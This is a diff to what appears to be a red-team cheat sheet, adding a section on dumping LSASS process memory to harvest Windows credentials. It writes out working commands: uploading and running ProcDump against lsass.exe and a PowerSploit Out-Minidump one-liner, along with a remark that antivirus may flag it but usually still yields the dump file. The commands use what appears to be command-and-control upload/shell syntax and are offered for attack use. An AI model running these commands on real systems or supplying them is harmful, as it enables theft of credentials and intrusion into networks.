@@ -98,7 +98,16 @@ SharpDPAPI and SharpChrome
 
 ---
 ## Exfiltration - Password Attacks
-
+### Dumping LSASS locally
+Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
+```
+# upload --> ProcDump.exe
+# shell ProcDump.exe -ma lsass.exe lsass.dmp
+```
+Dumping LSASS with (Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)
+```
+# powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
+```
 
 ---
 # References
